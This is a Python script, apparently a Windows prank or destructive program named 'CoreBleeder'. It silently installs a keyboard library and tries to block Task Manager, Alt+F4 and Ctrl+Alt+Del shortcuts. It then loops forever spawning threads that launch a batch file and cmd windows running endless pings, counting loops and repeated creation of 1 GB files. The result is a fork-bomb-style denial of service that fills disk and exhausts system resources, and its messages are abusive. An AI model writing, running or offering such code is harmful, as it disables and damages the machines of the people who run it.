import os
import time
import subprocess
import sys
import threading
import random
import ctypes
from ctypes import wintypes
from pathlib import Path

# Function to check if pynput is installed, and install it if necessary
def check_and_install_pynput():
    try:
        # Try importing pynput to check if it's installed
        import pynput
        try:
            print("""
                                                        _____                                           _____          _____                  
        _____         ____     ___________         _____\    \ ______  ______  _____               _____\    \    _____\    \ ____________    
   _____\    \_   ____\_  \__  \          \       /    / |    |\     \|\     \|\    \             /    / |    |  /    / |    |\           \   
  /     /|     | /     /     \  \    /\    \     /    /  /___/| |     |\|     |\\    \           /    /  /___/| /    /  /___/| \           \  
 /     / /____/|/     /\      |  |   \_\    |   |    |__ |___|/ |     |/____ /  \\    \         |    |__ |___|/|    |__ |___|/  |    /\     | 
|     | |____|/|     |  |     |  |      ___/    |       \       |     |\     \   \|    | ______ |       \      |       \        |   |  |    | 
|     |  _____ |     |  |     |  |      \  ____ |     __/ __    |     | |     |   |    |/      \|     __/ __   |     __/ __     |    \/     | 
|\     \|\    \|     | /     /| /     /\ \/    \|\    \  /  \   |     | |     |   /            ||\    \  /  \  |\    \  /  \   /           /| 
| \_____\|    ||\     \_____/ |/_____/ |\______|| \____\/    | /_____/|/_____/|  /_____/\_____/|| \____\/    | | \____\/    | /___________/ | 
| |     /____/|| \_____\   | / |     | | |     || |    |____/| |    |||     | | |      | |    ||| |    |____/| | |    |____/||           | /  
 \|_____|    || \ |    |___|/  |_____|/ \|_____| \|____|   | | |____|/|_____|/  |______|/|____|/ \|____|   | |  \|____|   | ||___________|/   
        |____|/  \|____|                               |___|/                                          |___|/         |___/                  
""")
        except Exception:
            print("CoreBleeder")
    except ImportError:
        # If pynput is not installed, install it
        print("p is not installed. Installing...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pynput"])

from pynput import keyboard

BLOCKED_COMBOS = [
    {keyboard.Key.ctrl_l, keyboard.Key.shift, keyboard.Key.esc},
    {keyboard.Key.alt_l, keyboard.Key.f4},
    {keyboard.Key.ctrl_l, keyboard.Key.alt_l, keyboard.Key.delete}
]

current_keys = set()

def on_press(key):
    # Add the pressed key to the current_keys set
    current_keys.add(key)

    # Check if any blocked combination is pressed
    for combo in BLOCKED_COMBOS:
        if combo.issubset(current_keys):
            print(f"Blocked shortcut: {combo}")
            return False  # Returning False will block the key event

def on_release(key):
    # Remove the released key from current_keys set
    if key in current_keys:
        current_keys.remove(key)

def start_listener():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


list1=["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]
list2=["a", "b", "c", "d", "e", "f"]

os.system("color 04")
os.system('echo "You fucked up"')
time.sleep(2)

bat = Path(__file__).parent / "main.bat"

# Function to open a command-line task based on the OS
def open_task():
    if os.name == 'nt':
        CR1 = random.choice(list1)
        CR2 = random.choice(list2)
        CR3 = random.choice(list1)
        CR4 = random.choice(list2)  # Windows
        bat = Path(__file__).parent / "main.bat"
        os.startfile(str(bat.resolve()))  # opens like double-clicking the file
        os.system(f'start cmd /k "color {CR1}{CR2} & ping 192.168.1.1 -t & for /L %i in (1,1,1000000) do @echo %i*%i & fsutil file createnew C:\temp\bigfile.txt 1073741824 & color {CR3}{CR4}"')
    else:  # Mac/Linux
        print("Filthy linux, go fuck yourself")

def open_many_tasks(n):
    for _ in range(n):
        thread = threading.Thread(target=open_task)
        thread.start()


# Main function to run the program
if __name__ == "__main__":
    # Pure ctypes method to resize current console
    STD_OUTPUT_HANDLE = -11
    h = ctypes.windll.kernel32.GetStdHandle(STD_OUTPUT_HANDLE)

    class COORD(ctypes.Structure):
        _fields_ = [("X", wintypes.SHORT), ("Y", wintypes.SHORT)]

    class SMALL_RECT(ctypes.Structure):
        _fields_ = [("Left", wintypes.SHORT),
                    ("Top", wintypes.SHORT),
                    ("Right", wintypes.SHORT),
                    ("Bottom", wintypes.SHORT)]

    # Set buffer size
    ctypes.windll.kernel32.SetConsoleScreenBufferSize(h, COORD(180, 50))

    # Set window size
    rect = SMALL_RECT(0, 0, 179, 49)  # Right and Bottom are zero-indexed
    ctypes.windll.kernel32.SetConsoleWindowInfo(h, True, ctypes.byref(rect))

    check_and_install_pynput()

    # Start the keyboard listener in a separate thread
    listener_thread = threading.Thread(target=start_listener)
    listener_thread.daemon = True  # This makes the listener exit when the main program ends
    listener_thread.start()

    while True:
        open_many_tasks(10)
